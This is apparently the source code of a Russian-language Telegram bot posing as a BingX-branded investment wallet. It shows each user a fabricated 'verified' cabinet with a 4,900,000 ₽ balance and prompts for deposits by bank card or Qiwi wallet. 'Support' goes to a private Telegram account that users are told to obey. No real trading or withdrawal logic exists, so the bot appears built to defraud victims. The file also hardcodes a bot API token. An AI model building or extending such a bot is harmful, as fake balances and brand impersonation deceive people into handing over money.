const TelegramBot = require('node-telegram-bot-api');

const token = '6334457411:AAGFFmCL_JSaN6BAeMicY9So0fG5st1L49w'

const bot = new TelegramBot(token, { polling: true });


const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📊 ECN Счет' }],
            [{ text: '💼 Личный Кабинет' }],
            [{ text: '⚙️ Тех.Поддержка' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

const menuKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📊 ECN Счет' }],
            [{ text: '💼 Личный Кабинет' }],
            [{ text: '⚙️ Тех.Поддержка' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const usersActivated = new Set();

function generateLkKeyboard() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💳 Пополнить', callback_data: 'deposit' }, { text: '💸 Вывести', callback_data: 'withdraw' }],
                [{ text: '🔒 Верификация', callback_data: 'verification' }],
                [{ text: '⚙️ Настройки', callback_data: 'settings' }]
            ]
        }
    };
}

function generateDepKeyboard() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💳 Пополнить банковской картой', callback_data: 'deposit_with_card' }],
                [{ text: '💰 Пополнить киви кошельком', callback_data: 'deposit_with_wallet' }],
            ]
        }
    };
}



bot.setMyCommands([
    { command: '/start', description: 'Запуск бота' },
    { command: '/help', description: 'Помощь' },
]);

bot.on('message', async (msg) => {
    const text = msg.text;
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (text === '/start') {
        const username = msg.from.username;
        if (!usersActivated.has(chatId)) {
            usersActivated.add(chatId);
            bot.sendMessage(chatId, `🎉 Привет, @${username}!\n` +
                'Политика и условия пользования данным ботом.\n' +
                '1. Перед принятием инвестиционного решения Инвестору необходимо самостоятельно оценить экономические риски и выгоды, налоговые, юридические, бухгалтерские последствия заключения сделки, свою готовность и возможность принять такие риски. Клиент также несет расходы на оплату брокерских и депозитарных услуг\n' +
                '2. Принимая правила, Вы подтверждаете своё согласие со всеми вышеперечисленными правилами!\n' +
                '3. Ваш аккаунт может быть заблокирован в подозрении на мошенничество/обман нашей системы! Каждому пользователю необходима верификация для вывода крупной суммы средств.\н' +
                '4. Мультиаккаунты запрещены!\n' +
                '5. Скрипты, схемы, тактики использовать запрещено!\n' +
                '6. Если будут выявлены вышеперечисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n' +
                '7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n' +
                '\n' +
                'По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам игры обращайтесь в поддержку, указанную в описании к боту.\n' +
                '\n' +
                'Спасибо за понимание, Ваш «@BingX_wallet_bot»', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Принять ✓', callback_data: 'accept' }]
                    ]
                }
            });
        } else {
            bot.sendMessage(chatId, '🖥 Личный кабинет\n' +
                '\n' +
                '➖➖➖➖➖➖➖➖➖➖\n' +
                `Ваш ID: ${userId}\n` +
                'Верификация: ✅ Верифицирован\n' +
                'Статус: Подозрительный\n' +
                '➖➖➖➖➖➖➖➖➖➖\n' +
                '💰 Баланс : 4900000 ₽\n' +
                '📂 На выводе : 0 ₽\n' +
                '➖➖➖➖➖➖➖➖➖➖\n' +
                '📊 Всего сделок : 2\n' +
                '\n' +
                '✅ Успешных сделок : 2\n' +
                '❌ Неуспешных сделок : 0\n' +
                '➖➖➖➖➖➖➖➖➖➖\n' +
                '📝 Зарегистрирован: 24 д.\n' +
                '➖➖➖➖➖➖➖➖➖➖\n' +
                '\n' +
                '⚠️ Наша техническая поддержка - @alinkamurcc. Сотрудники технической поддержки никогда не пишут вам первыми.', generateLkKeyboard());
        }
    }

    if (text === '/wallet' || text === '📊 ECN Счет') {
        bot.sendPhoto(chatId, 'https://imgur.com/a/VWrcPFn', {
            caption: '📊 ECN счёт\nВыберите монету для инвестирования денежных средств'
        });
    }

    if (text === '/lk' || text === '💼 Личный Кабинет') {
        bot.sendMessage(chatId, '🖥 Личный кабинет\n' +
            '\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            `Ваш ID: ${userId}\n` +
            'Верификация: ✅ Верифицирован\n' +
            'Статус: Подозрительный\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '💰 Баланс : 4900000 ₽\n' +
            '📂 На выводе : 0 ₽\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '📊 Всего сделок : 2\n' +
            '\n' +
            '✅ Успешных сделок : 2\n' +
            '❌ Неуспешных сделок : 0\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '📝 Зарегистрирован: 24 д.\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '\n' +
            '⚠️ Наша техническая поддержка - @alinkamurcc. Сотрудники технической поддержки никогда не пишут вам первыми.', generateLkKeyboard());
    }

    if (text === '/support' || text === '⚙️ Тех.Поддержка') {
        bot.sendMessage(chatId, '⚙️ Техническая поддержка\n' +
            '\n' +
            'Для обращения в поддержку прочитайте инструкцию ниже.\n' +
            '\n' +
            '1. При первом обращении укажите ваш ID\n' +
            '2.Опишите подробнее что у вас случилось\n' +
            '3.Выполняйте все действия агента в худшем случае он будет вынужден покинуть чат поддержки.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Обратиться в поддержку', url: 'https://t.me/alinkamurcc' }]
                ]
            }
        });
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;

    if (query.data === 'accept') {
        await bot.deleteMessage(chatId, messageId).catch((error) => {
            console.error("Ошибка при удалении сообщения:", error);
        });

        bot.sendMessage(chatId, '🖥 Личный кабинет\n' +
            '\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            `Ваш ID: ${userId}\n` +
            'Верификация: ✅ Верифицирован\n' +
            'Статус: Подозрительный\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '💰 Баланс : 4900000 ₽\n' +
            '📂 На выводе : 0 ₽\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '📊 Всего сделок : 2\n' +
            '\n' +
            '✅ Успешных сделок : 2\n' +
            '❌ Неуспешных сделок : 0\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '📝 Зарегистрирован: 24 д.\n' +
            '➖➖➖➖➖➖➖➖➖➖\n' +
            '\n' +
            '⚠️ Наша техническая поддержка - @alinkamurcc. Сотрудники технической поддержки никогда не пишут вам первыми.',
            generateLkKeyboard()
        );
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💰 Выберите метод пополнения через который Вы хотите совершить пополнение.', generateDepKeyboard());
    } else if (query.data === 'deposit_with_card') {
        bot.sendMessage(chatId, 'Введите сумму пополнения банковской картой:\n' +
            '\n' +
            'Минимальная сумма - [МИНИМАЛЬНАЯ_СУММА]');
    } else if (query.data === 'deposit_with_wallet') {
        bot.sendMessage(chatId, 'Введите сумму пополнения киви кошельком:\n' +
            '\n' +
            'Минимальная сумма - [МИНИМАЛЬНАЯ_СУММА]');
    }

    bot.answerCallbackQuery(query.id);
});


